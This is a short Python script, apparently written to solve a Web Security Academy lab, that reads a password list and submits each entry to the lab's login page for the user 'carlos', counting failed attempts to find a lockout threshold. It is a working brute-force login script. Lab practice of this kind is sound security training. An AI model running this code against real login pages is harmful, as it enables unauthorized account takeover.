import requests as req 

url = "https://0a1600100438841b805f4e9500db00aa.web-security-academy.net/login"
user = "carlos"

pass_file = open("../passwords")

ctr = 0

while password := pass_file.readline().strip():
    dat = {"username":user,"password":password}
    x = req.post(url, dat)
    if "Incorrect password" in x.text:
        ctr += 1
    else:
        break

print(f"reset limit is {ctr}")